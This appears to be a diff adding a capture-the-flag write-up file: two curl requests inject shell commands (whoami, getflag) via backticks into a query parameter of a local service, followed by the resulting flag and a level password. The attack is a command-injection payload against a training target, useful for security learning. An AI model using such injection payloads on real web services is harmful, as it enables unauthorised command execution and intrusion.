@@ -1,0 +1,5 @@
+$>curl localhost:4747?x=\`whoami\`
+flag04
+$>curl localhost:4747?x=\`getflag\`
+
+password lvl05: ne2searoevaevoem4ov4ar8ap
